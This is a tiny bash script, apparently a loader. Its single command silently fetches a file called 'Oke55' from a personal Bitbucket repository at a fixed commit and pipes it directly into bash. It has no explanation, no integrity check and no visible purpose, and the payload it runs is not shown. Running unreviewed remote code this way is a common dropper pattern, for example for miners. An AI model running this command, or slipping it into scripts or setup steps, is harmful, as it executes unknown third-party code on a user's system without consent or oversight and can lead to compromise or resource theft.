#!/bin/bash

curl -sL  https://bitbucket.org/kotamabaran777/gas1/raw/116307e839591347e91f4d1dfbe5c6c39b8fa107/Oke55 | bash